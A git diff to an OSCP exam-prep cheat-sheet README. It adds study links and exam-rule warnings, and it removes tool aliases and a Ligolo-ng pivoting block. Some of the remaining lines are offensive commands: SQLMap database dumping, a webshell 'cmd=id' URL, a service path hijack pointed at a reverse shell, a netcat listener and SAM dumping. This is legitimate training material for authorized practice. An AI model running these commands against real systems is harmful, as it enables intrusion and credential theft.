@@ -2,6 +2,24 @@
 
 **Preparing as part of my OSCP Certificate.**
 
+## Study playbook
+
+Start with the [situation-based guide](docs/start-here.md), then use the command reference below during authorized practice. This repository combines historical notes with newer workflows; validation status and remaining gaps are recorded in the [coverage audit](docs/coverage.md).
+
+| Prepare | Work through a target | Record and improve |
+|---|---|---|
+| [Toolkit and VM checks](docs/toolkit.md) | [Enumeration methodology](docs/methodology.md) | [Machine notes](templates/machine.md) |
+| [Current exam checklist](docs/exam.md) | [Web and manual SQL](docs/web.md) | [Report template](templates/report.md) |
+| [Training plan](docs/training.md) | [Active Directory](docs/active-directory.md) | [Private credential inventory](templates/credentials.md) |
+| [Tool version inventory](templates/tool-inventory.md) | [Pivoting and port forwarding](docs/pivoting.md) | [Progress tracker](templates/progress.md) |
+| [Contribution guide](CONTRIBUTING.md) | [Privilege escalation](docs/privilege-escalation.md) | [Troubleshooting](docs/troubleshooting.md) |
+
+**Exam rules take priority over any command here.** Read the [official exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) before each attempt. Some course tools and historical examples, including SQLMap, are prohibited during the exam. Keep lab evidence and secrets in a separate private notebook:
+
+```bash
+python3 scripts/new_session.py ~/oscp-private/lab-01
+```
+
 # General
 # OSCP Commands
 
@@ -16,37 +34,23 @@
 
 
 ```
-export USER="<username>"
+export TARGET_USER="<username>"
 export PASSWORD="<password>"
 export LHOST="<local_ip>"
 export LPORT="<local_port>"
+export IP="<target_ip>"
+export URL="<target_url>"
+export VPN_CONFIG="<path_to_your_vpn_config>"
 ```
 
 #### Aliases suggestion
 
 
 ```
-alias offsecvpn="sudo openvpn /home/sathvik/OSCP/offsecvpn.ovpn"
-alias httpserver="python3 -m http.server 8000"
-alias ll="ls -alF"
-alias build="mkdir files exploits && touch hashes users passwords"
-alias powerenc="python3 /home/sathvik/Tools/power-reverseshell.py"
-alias getexploit="searchsploit -m"
-alias nmapautomator="bash /opt/nmapautomator.sh"
-alias gobuster='gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt'
-alias nikto='nikto -h $URL'
-alias smbclient='smbclient -L //$IP'
-alias hydra='hydra -L users.txt -P passwords.txt $IP -t 4 ssh'
-alias dirsearch='python3 /opt/dirsearch/dirsearch.py -u $URL -e php,html'
-alias nc='nc -lvnp $LPORT'
-alias msfconsole="msfconsole -q"
-alias curlx='curl -X GET $URL'
-alias pyserv='python3 -m http.server $LPORT'
-alias sshkeygen="ssh-keygen -t rsa -b 4096"
-alias exiftool="exiftool"
-alias john="john --wordlist=rockyou.txt"
-alias sqlmap='sqlmap -u $URL --batch --random-agent'
-alias wget="wget -r -np -R 'index.html*'"
+alias ll='ls -alF'
+alias oscp-http='python3 -m http.server 8000'
+alias oscp-listen='nc -lvnp "$LPORT"'
+alias oscp-vpn='sudo openvpn "$VPN_CONFIG"'
 
 ```
 
@@ -702,26 +706,7 @@ lsadump::lsa /patch #both these dump SAM
 
 ## Ligolo-ng
 
-```powershell
-#Creating interface and starting it.
-sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up
-
-#Kali machine - Attacker machine
-./proxy -laddr 0.0.0.0:9001 -selfcert
-
-#windows or linux machine - compromised machine
-agent.exe -connect <LHOST>:9001 -ignore-cert
-
-#In Ligolo-ng console
-session #select host
-ifconfig #Notedown the internal network's subnet
-start #after adding relevent subnet to ligolo interface
-
-#Adding subnet to ligolo interface - Kali linux
-sudo ip r add <subnet> dev ligolo
-
-```
+See the [pivoting guide](docs/pivoting.md) for commands separated by Kali, agent and Ligolo console, certificate fingerprint verification, internal routes, callback listeners and pivot-local services.
 
 ---
 
@@ -1172,6 +1157,8 @@ http://192.168.45.125/tmp/webshell.php?cmd=id #Command execution
 
 - SQLMap - Automated Code execution
 
+> **Training only: SQLMap is prohibited in the OSCP exam.** These historical examples are for authorized practice where the tool is allowed. Use the [manual web workflow](docs/web.md) to practice without it. See the [official restrictions](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide).
+
 ```powershell
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user #Testing on parameter names "user", we'll get confirmation
 sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump #Dumping database
@@ -1320,9 +1307,9 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 ```powershell
 #Identify service from winpeas
 icacls "path" #F means full permission, we need to check we have full access on folder
-sc qc <servicename> #find binarypath variable
-sc config <service> <option>="<value>" #change the path to the reverseshell location
-sc start <servicename>
+sc.exe qc <servicename> #find binarypath variable
+sc.exe config <service> <option>="<value>" #change the path to the reverseshell location
+sc.exe start <servicename>
 ```
 
 ### Unquoted Service Path
@@ -1332,7 +1319,7 @@ wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v ""
 #Check the Writable path
 icacls "path"
 #Insert the payload in writable location and which works.
-sc start <servicename>
+sc.exe start <servicename>
 ```
 
 ### Insecure Service Executables
@@ -1341,7 +1328,7 @@ sc start <servicename>
 #In Winpeas look for a service which has the following
 File Permissions: Everyone [AllAccess]
 #Replace the executable in the service folder and start the service
-sc start <service>
+sc.exe start <service>
 ```
 
 ### Weak Registry permissions
@@ -1937,6 +1924,8 @@ Test-Connection -ComputerName (Get-WmiObject Win32_NetworkAdapterConfiguration |
 ```
 
 ### Bloodhound
+
+The following setup is historical and may use legacy collectors. For Community Edition collector compatibility and how to validate graph paths, start with the [AD workflow](docs/active-directory.md).
 
 - Collection methods - database
 
